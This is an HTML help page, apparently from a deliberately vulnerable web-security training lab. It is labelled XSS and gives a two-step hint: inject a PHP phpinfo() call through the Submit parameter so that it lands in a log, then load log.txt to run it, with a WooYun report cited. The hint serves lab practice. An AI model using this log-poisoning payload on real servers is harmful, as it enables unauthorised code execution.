<div class="body_padded">
	<h1>Help - XSS</h1>
	
	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">

		<p> 试一试: ?Submit=lxj616_is_handsomesafsdf&lt?php phpinfo() ?&gt ，然后再试一下: ?Submit=log.txt ， 去wooyun.org查看原始的漏洞报告！ </p>
		
	</div></td>
	</tr>
	</table>
	
	</div>
	
	<br />
	
	<p>Reference: http://www.wooyun.org/bugs/wooyun-2010-02236</p>

</div>
		